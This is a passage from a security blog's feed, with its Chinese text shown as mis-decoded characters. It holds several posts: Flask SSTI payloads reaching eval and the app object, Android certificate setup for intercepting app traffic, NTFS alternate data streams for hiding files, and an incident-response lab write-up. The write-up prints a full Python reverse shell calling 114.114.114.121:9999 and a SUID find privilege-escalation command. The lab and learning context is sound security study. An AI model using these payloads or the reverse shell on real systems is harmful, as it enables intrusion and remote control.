ˆæ‹¿æ³•ï¼šurl_for.__globals__[â€˜_request_ctx_stackâ€™].requestï¼Œè¯¥æ–¹æ³•åˆ°2.3.xå°±æ— æ³•è·å–å€¼äº†ï¼Œä¼šè¿”å›none</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&#123;url_for.__globals__.get(&#x27;_request_ctx_stack&#x27;)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410190011172.png" alt="image-20241019001140099"></p></li><li><p>é€šç”¨çš„æ‹¿æ³•å°±æ˜¯ç›´æ¥ç”¨url_for.__globals__[â€˜requestâ€™]</p><p><img src="https://cdn.clown2024.cn/202410190013035.png" alt="image-20241019001345973"></p></li><li><p>é«˜ç‰ˆæœ¬æ›¿ä»£å †æ ˆæ‹¿æ³•ï¼šåœ¨çœ‹æ–‡ç« çš„æ—¶å€™å‘ç°äº†ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªæ¥æ‹¿url_for.__globals__[â€˜current_appâ€™].request_context.__globals__[â€˜request_ctxâ€™]</p><p><img src="https://cdn.clown2024.cn/202410200048481.png" alt="image-20241020004833401"></p><p>å¯ä»¥çœ‹åˆ°æ‹¿çš„ä¹Ÿæ˜¯RequestContextå¯¹è±¡</p></li></ul><h2 id="app"><a href="#app" class="headerlink" title="app"></a>app</h2><ul><li><p>é€šå¸¸çš„æ‹¿æ³•ä¸ºï¼šurl_for.__globals__[â€˜current_appâ€™]ï¼Œä½†æ˜¯åœ¨2.3.xçš„ç‰ˆæœ¬è¿™ä¸ªæ–¹æ³•æ˜¯æ‹¿ä¸åˆ°current_appçš„ï¼Œå…·ä½“åŸå› copyä¸€ä¸‹caterpie771å¤§ç¥çš„ç ”ç©¶æˆæœ</p><blockquote><p>flask2.1.3 ä¸­ï¼ŒSSTIä½¿ç”¨çš„ <code>url_for</code> æŒ‡å‘äº† <strong>flask.helpers.url_for</strong></p><p>flask2.3.0 ä¸­ï¼ŒSSTIä½¿ç”¨çš„ <code>url_for</code> æŒ‡å‘äº† <strong>flask.app.Flask.url_for</strong></p><p>å„ç‰ˆæœ¬çš„ flask&#x2F;helpers.py éƒ½æ˜¯å¼•å…¥äº† current_app çš„</p><p>ä» 3.0.0 å¼€å§‹ flask&#x2F;app.py æ‰æœ‰å¼•å…¥ current_app</p><p>æ‰€ä»¥2.3.0çš„url_forçš„ä¸Šä¸‹æ–‡æ²¡æœ‰current_app</p></blockquote></li><li><p>ä¸€äº›æ›¿ä»£æ‹¿æ³•ï¼Œä¹Ÿå°±æ˜¯æ‹¿globalsçš„æ–¹æ³•ï¼Œä»–çš„ä¸Šä¸‹æ–‡å†…å®¹æ‰€åœ¨ä½ç½®ä¹Ÿæ ‡å‡ºæ¥ï¼ŒåŒæ ·æ˜¯æˆ‘ä»¬caterpie771å¤§ç¥çš„è°ƒè¯•ç»“æœ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">payload                                     context<br>get_flashed_messages.__globals__        flask.helpers<br>request.__init__.__globals__            werkzeug.wrappers.request<br>request.application.__globals__            werkzeug.wrappers.request<br>session.__init__.__globals__            flask.sessions<br>config.__class__.__init__.__globals__    flask.config<br></code></pre></td></tr></table></figure></li><li><p>è¿˜æœ‰ä¸€ä¸­æ˜¯é€šè¿‡sys.module[â€˜__main__â€˜].appè¿™ä¸ªæ¨¡å—æ¥æ‹¿ï¼Œæ‰€ä»¥å°±æ˜¯æ­£å¸¸sstié“¾å­çš„æµç¨‹æ‹¿åˆ°builtinså³å¯ï¼Œè¿™é‡Œå°±ä¸¾å‡ ä¸ªä¾‹å­</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&#123;lipsum.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].app&quot;)&#125;&#125;<br><br>&#123;&#123;x.__init__.__globals__[&#x27;sys&#x27;].modules[&#x27;__main__&#x27;].app&#125;&#125;<br></code></pre></td></tr></table></figure></li></ul><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="http://www.mi1k7ea.com/2021/04/07/%E6%B5%85%E6%9E%90Python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/">http://www.mi1k7ea.com/2021/04/07/%E6%B5%85%E6%9E%90Python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/</a></p><p><a href="https://www.cnblogs.com/gxngxngxn/p/18181936">https://www.cnblogs.com/gxngxngxn/p/18181936</a></p><p><a href="https://xz.aliyun.com/t/14526?time__1311=GqAhDIqjxmxfx0yx4+xCqqmqTrKFLep3x#toc-6">https://xz.aliyun.com/t/14526?time__1311=GqAhDIqjxmxfx0yx4%2BxCqqmqTrKFLep3x#toc-6</a></p><p><a href="https://tiangonglab.github.io/blog/tiangongarticle038/">https://tiangonglab.github.io/blog/tiangongarticle038/</a></p><p><a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/flask%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F/">https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/flask%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F/</a></p><p><a href="https://www.caterpie771.cn/2024/09/27/flask-%E5%86%85%E5%AD%98%E9%A9%AC/">https://www.caterpie771.cn/2024/09/27/flask-%E5%86%85%E5%AD%98%E9%A9%AC/</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…å­˜é©¬ </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>APPæ¸—é€æŠ“åŒ…ç¯å¢ƒé…ç½®</title>
      <link href="/2024/08/15/APP%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
      <url>/2024/08/15/APP%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="æ¨¡æ‹Ÿå™¨ä»£ç†è®¾ç½®"><a href="#æ¨¡æ‹Ÿå™¨ä»£ç†è®¾ç½®" class="headerlink" title="æ¨¡æ‹Ÿå™¨ä»£ç†è®¾ç½®"></a>æ¨¡æ‹Ÿå™¨ä»£ç†è®¾ç½®</h1><p>è¿™é‡Œç”¨é›·ç”µæ¨¡æ‹Ÿå™¨</p><p>ipconfigæŸ¥çœ‹ä¸€ä¸‹æœ¬æœºçš„IP</p><p><img src="https://cdn.clown2024.cn/202408151921468.png" alt="image-20240815192142415"></p><p>ç„¶ååœ¨burpæ·»åŠ ä¸€ä¸ªæ–°çš„ä»£ç†</p><p><img src="https://cdn.clown2024.cn/202408151922834.png" alt="image-20240815192241797"></p><p>ç„¶åæ¨¡æ‹Ÿå™¨ä¹Ÿè‡ªå®šä¹‰è¯¥ipåœ°å€</p><p><img src="https://cdn.clown2024.cn/202408151925440.png" alt="image-20240815192521373"></p><h1 id="è¯ä¹¦å®‰è£…"><a href="#è¯ä¹¦å®‰è£…" class="headerlink" title="è¯ä¹¦å®‰è£…"></a>è¯ä¹¦å®‰è£…</h1><p>è¿™é‡Œå¦‚æœè¦æŠ“httpsè¿˜éœ€è¦å®‰è£…ä¸€ä¸‹burpè¯ä¹¦ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/04.%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/06.%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%90%84%E7%A7%8D%E6%96%B9%E5%BC%8F%E6%8A%93%E5%8C%85/">https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/04.%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/06.%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%90%84%E7%A7%8D%E6%96%B9%E5%BC%8F%E6%8A%93%E5%8C%85/</a></p><blockquote><p>ä½†æ˜¯Android ä» 7.0 å¼€å§‹ï¼Œç³»ç»Ÿä¸å†ä¿¡ä»»ç”¨æˆ· CA è¯ä¹¦ï¼Œå®‰è£…è¯ä¹¦çš„æ–¹å¼å°±éº»çƒ¦ä¸€ç‚¹</p></blockquote><p>é¦–å…ˆè®¿é—®burpçš„ç›‘å¬åœ°å€ä¸‹è½½è¯ä¹¦</p><p><img src="https://cdn.clown2024.cn/202408151927057.png" alt="image-20240815192723003"></p><p>æ‰“å¼€æ–‡ä»¶ç®¡ç†å™¨å¯ä»¥çœ‹åˆ°è¯ä¹¦</p><p><img src="https://cdn.clown2024.cn/202408151928262.png" alt="image-20240815192845208"></p><p>ç„¶åç”¨kalié‡Œçš„å·¥å…·opensslè®¡ç®—è¯ä¹¦å“ˆå¸Œå€¼</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">openssl x509 -inform der -subject_hash_old -<span class="hljs-keyword">in</span> cacert.der -noout<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408151939380.png" alt="image-20240815193917347"></p><p>å°†è¯ä¹¦åæ”¹ä¸º<code>&lt;hash&gt;.0</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mv</span> cacert.der 9a5ba575.0<br></code></pre></td></tr></table></figure><p>ç„¶åç”¨<code>MTç®¡ç†å™¨</code>å°†å…¶ç§»åŠ¨åˆ°<code>/system/etc/security/cacerts/</code>ç›®å½•</p><blockquote><p>é›·ç”µ9è¿™é‡Œä¼šå‡ºç°æŒ‚è½½å¤±è´¥æ— æ³•ç§»åŠ¨çš„æƒ…å†µ</p><p><img src="https://cdn.clown2024.cn/202408151952697.png" alt="image-20240815195250615"></p><p>è¦åœ¨è®¾ç½®â€“&gt;æ€§èƒ½è®¾ç½®ä¿®æ”¹ä¸€ä¸‹vmdkå¯å†™</p><p><img src="https://cdn.clown2024.cn/202408151954575.png" alt="image-20240815195457525"></p></blockquote><p>éš¾ç»·çš„è¿˜æ˜¯ä¸è¡Œï¼Œæ¢ç½‘æ˜“çš„MuMuæ¨¡æ‹Ÿå™¨å°±å¥½äº†ï¼Œè¿™é›·ç”µæ¨¡æ‹Ÿå™¨ä»€ä¹ˆæ¯›ç—…ğŸ¥²</p><p>æµç¨‹å’Œä¸Šé¢ä¸€æ ·ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/shr592833253/article/details/139395912">ç”¨æ‰‹æœºæ¨¡æ‹Ÿå™¨è¿›è¡ŒAPPæ¸—é€æµ‹è¯•æŠ“åŒ…(è¶…è¯¦ç»†ç‰ˆ)_æ‰‹æœºæ¨¡æ‹Ÿå™¨æŠ“åŒ…-CSDNåšå®¢</a></p><p>è¯ä¹¦æ”¾è¿‡å»çš„æ—¶å€™è¦è®°å¾—æœ‰è¶³å¤Ÿæƒé™ï¼Œæœ‰äº›å¯èƒ½ä¸å¤Ÿï¼Œå¯ä»¥ç›´æ¥ç”¨mtæ”¹</p><p><img src="https://cdn.clown2024.cn/202408152317058.png" alt="image-20240815231730970"></p><p>ç„¶åæŠŠ&#x2F;systemè¿™ä¸ªç›®å½•çš„æƒé™ä¹Ÿæ”¹æˆ777</p><p><img src="https://cdn.clown2024.cn/202408152319326.png" alt="image-20240815231905270"></p><p>ç„¶åå°±å¯ä»¥æ­£å¸¸æŠ“åŒ…ä¹Ÿæ²¡æœ‰è¯ä¹¦é—®é¢˜äº†</p><p><img src="https://cdn.clown2024.cn/202408152321450.png" alt="image-20240815232138363"></p>]]></content>
      
      
      <categories>
          
          <category> appæ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NTFSæ•°æ®æµéšå†™</title>
      <link href="/2024/07/12/NTFS%E6%95%B0%E6%8D%AE%E6%B5%81%E9%9A%90%E5%86%99/"/>
      <url>/2024/07/12/NTFS%E6%95%B0%E6%8D%AE%E6%B5%81%E9%9A%90%E5%86%99/</url>
      
        <content type="html"><![CDATA[<p>è¿™æ˜¯åœ¨å‰æ–‡å­¦ä¹ mysqlææƒçš„æ—¶å€™é‡åˆ°çš„åˆ©ç”¨æ•°æ®æµå†™æ–‡ä»¶ï¼Œä»¥å‰æœ‰ç‚¹å°è±¡ä½†ä¸æ˜¯å¾ˆæ·±ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹ã€‚</p><h1 id="ntfsæ•°æ®æµä»‹ç»"><a href="#NTFSæ•°æ®æµä»‹ç»" class="headerlink" title="NTFSæ•°æ®æµä»‹ç»"></a>NTFSæ•°æ®æµä»‹ç»</h1><p>åœ¨NTFSæ–‡ä»¶ç³»ç»Ÿä¸­å­˜åœ¨ç€NTFSå¤‡ç”¨æ•°æ®æµï¼ˆAlternate Data Streamsï¼Œç®€ç§°ADSï¼‰ï¼Œè¿™æ˜¯NTFSç£ç›˜æ ¼å¼çš„ç‰¹æ€§ä¹‹ä¸€ã€‚æ¯ä¸€ä¸ªæ–‡ä»¶ï¼Œéƒ½æœ‰ç€ä¸»æ–‡ä»¶æµå’Œéä¸»æ–‡ä»¶æµï¼Œä¸»æ–‡ä»¶æµèƒ½å¤Ÿç›´æ¥çœ‹åˆ°ï¼›è€Œéä¸»æ–‡ä»¶æµå¯„å®¿äºä¸»æ–‡ä»¶æµä¸­ï¼Œæ— æ³•ç›´æ¥è¯»å–ï¼Œè¿™ä¸ªéä¸»æ–‡ä»¶æµå°±æ˜¯NTFSå¤‡ç”¨æ•°æ®æµã€‚</p><p>ADSçš„ä½œç”¨åœ¨äºï¼Œå®ƒå…è®¸ä¸€ä¸ªæ–‡ä»¶æºå¸¦ç€é™„åŠ çš„ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼ŒIEæµè§ˆå™¨ä¸‹è½½æ–‡ä»¶æ—¶ï¼Œä¼šå‘æ–‡ä»¶æ·»åŠ ä¸€ä¸ªæ•°æ®æµï¼Œæ ‡è®°è¯¥æ–‡ä»¶æ¥æºäºå¤–éƒ¨ï¼Œå³å¸¦æœ‰é£é™©ï¼Œé‚£ä¹ˆï¼Œåœ¨ç”¨æˆ·æ‰“å¼€æ–‡ä»¶æ—¶ï¼Œå°±ä¼šå¼¹å‡ºæ–‡ä»¶è­¦å‘Šæç¤ºã€‚å†å¦‚ï¼Œåœ¨ç½‘å€æ”¶è—ä¸­ï¼Œä¹Ÿä¼šé™„åŠ ä¸€ä¸ªfaviconæ•°æ®æµä»¥å­˜æ”¾ç½‘ç«™å›¾æ ‡ã€‚</p><p>ADSä¹Ÿè¢«ç”¨äºä¸€äº›æ¶æ„æ–‡ä»¶éšè—è‡ªèº«,ä½œä¸ºåé—¨ã€‚</p><h1 id="adsåº”ç”¨"><a href="#ADSåº”ç”¨" class="headerlink" title="ADSåº”ç”¨"></a>ADSåº”ç”¨</h1><p>è¿™é‡Œå†™ä¸€ä¸ªéšè—æ–‡æœ¬æ¥çœ‹çœ‹ï¼Œé¦–å…ˆåˆ›å»ºä¸€ä¸ªç©ºçš„example.txtï¼Œç„¶åå†™å…¥ADSï¼Œè¿™é‡Œå†™å…¥ä¸€ä¸ªå­—ç¬¦ä¸²</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;123&quot;</span> &gt; example.txt:config <span class="hljs-comment">#è¿™é‡Œè¦ç”¨cmdï¼Œç”¨powershellä¼šæŠ¥é”™</span><br></code></pre></td></tr></table></figure><p>ç„¶åç›´æ¥æ‰“å¼€æ–‡ä»¶è¿˜æ˜¯ç©ºçš„</p><p><img src="http://cdn.clown2024.cn/202407151442538.png" alt="image-20240713015237491"></p><p>æƒ³è¦æŸ¥çœ‹ADSçš„è¯å¯ä»¥è¿™æ ·</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">notepad example.txt:config<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151442539.png" alt="image-20240713015437701"></p><p>è¿˜æœ‰ç”¨ä¸‹é¢å‘½ä»¤æŸ¥çœ‹è¯¥æ–‡ä»¶æ‰€æœ‰çš„ADS</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dir</span> example.txt /R<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151442540.png" alt="image-20240713015550479"></p><p>ADSå¯ä»¥å†™ä»»ä½•ä¸œè¥¿ï¼ŒåŒ…æ‹¬å›¾ç‰‡ã€éŸ³é¢‘ã€è§†é¢‘ç­‰ï¼Œæ‰€ä»¥å¯ä»¥ç”¨æ¥éšè—åé—¨ï¼Œåœ¨Windows XPä¸­ï¼Œå¯æ‰§è¡Œæ–‡ä»¶å¯ä»¥éšè—å¹¶ä¸”è¢«æ‰§è¡Œã€‚ä½†æ˜¯ï¼Œå¾®è½¯å·²ç»å‘ç°äº†è¿™ä¸ªé—®é¢˜å¹¶è¿›è¡Œäº†ä¿®å¤ï¼Œç›®å‰åœ¨Windows VistaåŠåç»­ç³»ç»Ÿä¸­å·²ç»æ— æ³•ç›´æ¥è¿è¡ŒADSä¸­çš„å¯æ‰§è¡Œæ–‡ä»¶äº†ã€‚</p><p>å¯ä»¥ç›´æ¥è¿™æ ·å†™å…¥æ–‡ä»¶ï¼Œå…¶ä»–æ–‡ä»¶åŒç†</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">type</span> <span class="hljs-number">01</span>.txt &gt; example.txt:<span class="hljs-number">01</span>.txt<br><span class="hljs-built_in">type</span> <span class="hljs-number">01</span>.txt &gt;&gt; example.txt:<span class="hljs-number">01</span>.txt<br></code></pre></td></tr></table></figure><p>ADSæ•°æ®æµæ–‡ä»¶æœ‰ä¸‰ç§åˆ é™¤æ–¹å¼ã€‚ä¸€æ˜¯ç›´æ¥<strong>åˆ é™¤å®¿ä¸»</strong>æ–‡ä»¶ï¼ŒäºŒæ˜¯å°†å®¿ä¸»æ–‡ä»¶<strong>ç§»åˆ°</strong>FAT32<strong>ç­‰é</strong>NTFS<strong>åˆ†åŒºä¸­</strong>ï¼›ä¸‰æ˜¯åˆ©ç”¨<strong>å·¥å…·è½¯ä»¶</strong>ï¼Œå¦‚IceSwordã€Ntfs Streams Editoråˆ é™¤ã€‚</p><p>Ntfs Streams Editoråˆ é™¤å‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">streams.exe -d &lt;File&gt;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æ‚ä¸ƒæ‚å…« </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ‚ä¸ƒæ‚å…« </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç„æœºåº”æ€¥å“åº”é¶åœº-ç¬¬ä¸‰ç« </title>
      <link href="/2024/07/12/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%B8%89%E7%AB%A0/"/>
      <url>/2024/07/12/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%B8%89%E7%AB%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="linuxæƒé™ç»´æŒ"><a href="#Linuxæƒé™ç»´æŒ" class="headerlink" title="Linuxæƒé™ç»´æŒ"></a>Linuxæƒé™ç»´æŒ</h1><p>é¶æœºç®€ä»‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ssh root@env.xj.edisec.net -p  å¯†ç   xjqxwcyc<br>1.é»‘å®¢éšè—çš„éšè—çš„æ–‡ä»¶ å®Œæ•´è·¯å¾„md5<br>2.é»‘å®¢éšè—çš„æ–‡ä»¶åå¼¹shellçš„ip+ç«¯å£ &#123;ip:port&#125;<br>3.é»‘å®¢ææƒæ‰€ç”¨çš„å‘½ä»¤ å®Œæ•´è·¯å¾„çš„md5 flag&#123;md5&#125; <br>4.é»‘å®¢å°è¯•æ³¨å…¥æ¶æ„ä»£ç çš„å·¥å…·å®Œæ•´è·¯å¾„md5<br>5.ä½¿ç”¨å‘½ä»¤è¿è¡Œ ./x.xx æ‰§è¡Œè¯¥æ–‡ä»¶  å°†æŸ¥è¯¢çš„ Exec****** å€¼ ä½œä¸ºflagæäº¤ flag&#123;/xxx/xxx/xxx&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçœ‹äº†ä¸€ä¸‹webç›®å½•æ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œç›´æ¥ç”¨Dç›¾å…¨ç›˜æŸ¥æ€ä¸€ä¸‹</p><blockquote><p>è¿™é‡ŒæŒ‚è½½è¦æŒ‡å®šç«¯å£ï¼ŒæŒ‡å®šç«¯å£çš„å½¢å¼æ˜¯è¿™æ ·çš„ï¼š\sshfs.r\username@remote_ip!port\</p></blockquote><p>emmmä½†æ˜¯å¡ä½äº†æ‰«ä¸å‡ºæ¥ä¸œè¥¿</p><p><img src="http://cdn.clown2024.cn/202407151452447.png" alt="image-20240712163333073"></p><p>æœ€åæ˜¯åœ¨&#x2F;tmpç›®å½•ä¸‹å‘ç°äº†ä¸€ä¸ªéšè—æ–‡ä»¶ï¼Œé‡Œé¢æœ‰pythonè„šæœ¬&#x2F;tmp&#x2F;.temp&#x2F;libprocesshider&#x2F;1.py</p><p><img src="http://cdn.clown2024.cn/202407151452448.png" alt="image-20240712162238473"></p><p>flag{109ccb5768c70638e24fb46ee7957e37}</p><p>å…¶è„šæœ¬å†…å®¹</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">import</span> socket,subprocess,os,sys, time<br><br>pidrg = os.fork()<br><span class="hljs-keyword">if</span> pidrg &gt; <span class="hljs-number">0</span>:<br>        sys.exit(<span class="hljs-number">0</span>)<br><br>os.chdir(<span class="hljs-string">&quot;/&quot;</span>)<br>os.setsid()<br>os.umask(<span class="hljs-number">0</span>)<br>drgpid = os.fork()<br><span class="hljs-keyword">if</span> drgpid &gt; <span class="hljs-number">0</span>:<br>        sys.exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">try</span>:<br>                sys.stdout.flush()<br>                sys.stderr.flush()<br>                fdreg = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/null&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)<br>                sys.stdout = fdreg<br>                sys.stderr = fdreg<br>                sdregs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>                sdregs.connect((<span class="hljs-string">&quot;114.114.114.121&quot;</span>,<span class="hljs-number">9999</span>))<br>                os.dup2(sdregs.fileno(),<span class="hljs-number">0</span>)<br>                os.dup2(sdregs.fileno(),<span class="hljs-number">1</span>)<br>                os.dup2(sdregs.fileno(),<span class="hljs-number">2</span>)<br>                p=subprocess.call([<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>])<br>                sdregs.close()<br>        <span class="hljs-keyword">except</span> Exception:<br>                <span class="hljs-keyword">pass</span><br>        time.sleep(<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>å…¶åå¼¹shellçš„ipå’Œç«¯å£å°±æ˜¯ä¸Šé¢ä»£ç ä¸­çš„</p><p>flag{114.114.114.121:9999}</p><blockquote><p>ä¸€å¼€å§‹æ‰¾åˆ°ä¸€ä¸ª1.shçš„è„šæœ¬ï¼Œé‡Œé¢æ˜¯ä¸€ä¸ªbashåå¼¹shellä½†æ˜¯é‚£ä¸ªç©æ„ä¸æ˜¯flagï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯ç¯å¢ƒæ²¡æ€ä¹ˆæ”¹ã€‚ã€‚ã€‚</p></blockquote><p>æŸ¥çœ‹é»‘å®¢çš„ææƒå‘½ä»¤ï¼Œå…ˆçœ‹&#x2F;etc&#x2F;passwd</p><p><img src="http://cdn.clown2024.cn/202407151452449.png" alt="image-20240712162658912"></p><p>æœ‰ä¸ªctfç”¨æˆ·ï¼Œåˆ‡æ¢åˆ°è¯¥ç”¨æˆ·æ‰§è¡Œä¸‹é¢å‘½ä»¤æ‰¾æ˜¯å¦èƒ½å¤Ÿsuidææƒ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151452450.png" alt="image-20240712162931598"></p><p>å‘ç°findå‘½ä»¤å°±èƒ½ææƒ</p><p>å…¶ææƒå‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">/usr/bin/find . -<span class="hljs-built_in">exec</span> /bin/sh \; -quit<br></code></pre></td></tr></table></figure><p>flag{7fd5884f493f4aaf96abee286ee04120}</p><blockquote><p>emmmæ²¡æƒ³æ˜ç™½è¿™ä¸ªæ€è·¯æ˜¯æ€ä¹ˆæ¥çš„ï¼Œçœ‹åˆ«äººçš„wpï¼Œéš¾é“ææƒä¸€å®šæ˜¯suidå—ğŸ˜¥</p></blockquote><p>ç„¶åå°±æ˜¯æ‰¾æ³¨å…¥ä»£ç çš„æ¶æ„å·¥å…·ï¼Œè¿™é‡Œç”¨ä¸‹é¢è¿™ä¸ªå‘½ä»¤æŸ¥æ‰¾</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&#x27;.*&#x27;</span> 2&gt;/dev/null|grep -v <span class="hljs-string">&#x27;sys&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151452451.png" alt="image-20240712164100081"></p><p>æœç´¢å¯ä»¥çŸ¥é“è¿™æ˜¯ä¸€ä¸ªæ³¨å…¥å·¥å…·ï¼š<a href="https://cn-sec.com/archives/2563485.html">https://cn-sec.com/archives/2563485.html</a></p><blockquote><p>Cymothoaæ˜¯ä¸€æ¬¾éšç§˜çš„åé—¨å·¥å…·ï¼Œé€šè¿‡å‘ç›®æ ‡ä¸»æœºä¸Šæ´»è·ƒçš„è¿›ç¨‹æ³¨å…¥æ¶æ„ä»£ç æ¥æ‰§è¡Œåé—¨å·¥ä½œï¼Œè¿™ä¹Ÿåå‘è¯´æ˜äº†ï¼Œå®é™…ä¸ŠCymothoaåé—¨ä¼šæ‹¥æœ‰å’ŒåŸè¿›ç¨‹ç›¸åŒçš„æƒé™ï¼Œä¸”Cymothoaæ˜¯é€šè¿‡å‘ç³»ç»Ÿè¿›ç¨‹æ³¨å…¥shellcodeå»æ‰§è¡Œåé—¨ï¼Œæ‰€ä»¥ä¸ä¼šåƒä»¥å‰å†™è¿‡çš„è®¸å¤šåé—¨ä¸€æ ·åˆ›å»ºè‡ªå·±çš„è¿›ç¨‹ï¼Œè¿™ä½¿å¾—å®ƒçš„éšè”½æ€§æé«˜äº†å¾ˆå¤šã€‚</p></blockquote><p>æ‰€ä»¥å…¶å·¥å…·è·¯å¾„å¦‚ä¸‹ï¼š&#x2F;opt&#x2F;.cymothoa-1-beta&#x2F;cymothoa</p><p>flag{087c267368ece4fcf422ff733b51aed9}</p><p>æœ€åæ‰§è¡Œä¸€ä¸‹è¿™ä¸ª1.pyçš„è„šæœ¬æŸ¥è¯¢ä¸€ä¸‹ç½‘ç»œè¿æ¥</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python3 ./1.py<br>netstat -pantu<br><span class="hljs-built_in">cat</span> /proc/563/cmdline<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151452452.png" alt="image-20240712165626986"></p><p>ç„¶åæ‰¾åˆ°ä¸€ä¸ªè½¯é“¾æ¥ï¼Œè¿™ä¸ªå°±æ˜¯flag(æ²¡æ‡‚è·Ÿé¢˜ç›®æè¿°çš„æ­¥éª¤æœ‰ä»€ä¹ˆå…³ç³»</p><p>flag{&#x2F;usr&#x2F;bin&#x2F;python3.4}</p><blockquote><p>è¯´å®è¯æ˜¯åœ¨æ²¡çœ‹æ‡‚è¿™é‡Œæ˜¯ä»€ä¹ˆæ„æ€ï¼Œçœ‹çš„åˆ«äººçš„wpï¼Œæœ‰ç‚¹æ„ä¹‰ä¸æ˜ã€‚ã€‚ã€‚</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> åº”æ€¥å“åº” </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åº”æ€¥å“åº” </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysqlææƒ</title>
      <link href="/2024/07/12/mysql%E6%8F%90%E6%9D%83/"/>
      <url>/2024/07/12/mysql%E6%8F%90%E6%9D%83/</url>
      
